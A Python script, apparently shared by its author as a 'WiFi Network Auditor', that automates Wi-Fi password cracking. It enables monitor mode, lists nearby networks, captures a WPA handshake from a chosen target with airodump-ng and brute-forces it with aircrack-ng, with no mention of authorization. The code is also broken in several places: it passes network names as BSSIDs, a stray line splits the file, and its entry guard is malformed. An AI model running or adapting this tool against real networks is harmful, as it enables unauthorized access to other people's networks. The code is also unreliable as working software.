Python

import subprocess
import json
import time
import os
import itertools

BBlack="\033[1;30m"       
BRed="\033[1;31m"         
BGreen="\033[1;32m" 
BYellow="\033[1;33m"      
BBlue="\033[1;34m"
BPurple="\033[1;35m"      
BCayn="\033[1;36m"        
BWhite="\033[1;37m"       

def print_logo():
    logo = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀

{BYellow}Developer: @mrdarkvipx{BRed}

    """
    print(logo)
    print("WiFi Network Auditor By DarkBD\n")

def check_monitor_mode():
    print("[*] Detecting available WiFi network cards...")
    try:
        interfaces = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode("utf-8")
        wifi_interfaces = [line.split()[0] for line in interfaces.split("\n") if "IEEE 802.11" in line]
        
        if not wifi_interfaces:
            print("[!] No compatible WiFi interfaces found.")
            exit(1)

        print("[+] Available WiFi interfaces:")
        for idx, iface in enumerate(wifi_interfaces):
            print(f"  {idx + 1}. {iface}")

        choice = int(input("\nSelect the interface to enable monitor mode: ")) - 1
        if choice < 0 or choice >= len(wifi_interfaces):
            print("[!] Invalid option.")
            exit(1)

        interface = wifi_interfaces[choice]
        print(f"[*] Setting {interface} to monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
        print(f"[+] {interface} is now in monitor mode.")
        return f"{interface}mon"
    except Exception as e:
        print(f"[!] Error enabling monitor mode: {e}")
        exit(1)

def list_wifi_networks(interface):
    print("[*] Scanning available WiFi networks...")
    networks = subprocess.check_output(["sudo", "iwlist", interface, "scan"]).decode("utf-8")
    lines = networks.split("\n")
    essids = []
    for line in lines:
        if "ESSID:" in line:
            essid = line.split('"')[1]
            essids.append(essid)
    return essids

def capture_handshake(interface, target_bssid):
    print(f"[*] Starting handshake capture on {interface} for {target_bssid}...")
    subprocess.run(["sudo", "airodump-ng", interface, "--bssid", target_bssid, "-c", "1", "-w", "handshake"], check=True)

def brute_force_attack(wordlist):
    print(f"[*] Starting brute force attack using {wordlist}...")
    subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, "handshake-01.cap"], check=True)

def main():
    print_logo()

    interface = check_monitor_mode()

    essids = list_wifi_networks(interface)
    print("\n[*] Analyzing available WiFi networks...\n")
    time.sleep(2)
    
    if not essids:
        print("[!] No WiFi networks found.")
        exit(1)

    print("Available WiFi networks:")
    for idx, essid in enumerate(essids):
        print(f"  {idx + 1}. {essid}")

    choice = int(input("\nSelect the WiFi network to audit: ")) - 1
    if choice < 0 or choice >= len(essids):
        print("[!] Invalid option.")
        return

    target_bssid = essids[choice]
    print("\nAttack methods:")
    print("  1. Handshake capture")
    print("  2. Brute force attack (requires a password file)")

    attack_choice = int(input("\nSelect the attack method: "))
    if attack_choice == 1:
        capture_handshake(interface, target_bssid)
    elif attack_choice == 2:
        wordlist = input("\nEnter the path to the password file: ")
        if not os.path.isfile(wordlist):
            print("[!] Password file not found.")
            return
        brute_force_attack(wordlist)
    else:
        print("[!] Invalid option.")
        return
        
        
        Python

result = {
        "target_bssid": target_bssid,
        "attack_method": "handshake" if attack_choice == 1 else "brute_force",
    }
    with open("results.json", "w") as f:
        json.dump(result, f)
    print("\n[+] Results saved in results.json")
    print(result)

if name == "main":
    main()